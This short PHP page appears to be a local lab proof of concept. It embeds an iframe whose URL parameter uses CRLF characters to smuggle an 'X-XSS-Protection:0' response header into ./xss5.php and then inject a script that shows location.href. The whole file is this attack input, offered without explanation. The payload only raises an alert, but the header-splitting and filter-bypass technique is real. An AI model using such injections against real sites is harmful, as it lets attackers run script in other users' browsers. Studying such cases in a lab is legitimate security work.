<?php
header("Content-Security-Policy: frame-src http://localhost:80/");
?>

<iframe src="./xss5.php?url=http://www.baidu.com/%0a%0dX-XSS-Protection:0%0a%0d%0a%0d<script>alert(location.href)</script>"></iframe>